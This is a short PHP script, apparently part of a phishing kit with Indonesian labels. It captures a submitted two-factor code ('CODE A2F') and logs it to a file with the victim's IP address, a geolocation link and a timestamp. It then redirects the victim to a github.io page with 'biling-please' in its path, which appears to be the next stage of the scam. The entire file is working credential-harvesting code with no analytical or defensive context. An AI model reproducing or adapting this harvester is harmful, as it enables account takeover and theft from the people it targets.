

<?php
$file = "SELAMATDATANGKEMBALI";
$max = $_POST['max'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a'); 
fwrite($handle, "____________________");
fwrite($handle, "\n");
fwrite($handle, "CODE A2F        : ");
fwrite($handle, "$max");
fwrite($handle, "\n");
fwrite($handle, "Tanggal Login   : ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "https://www.geodatatool.com/en/?ip=$ip");
fwrite($handle, "\n");
fwrite($handle, "____________________");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"https://andsbusiness.github.io/customize-your-feed/biling-please/en/feloz?page-container-navigation\";
// -->
</script>";
?>
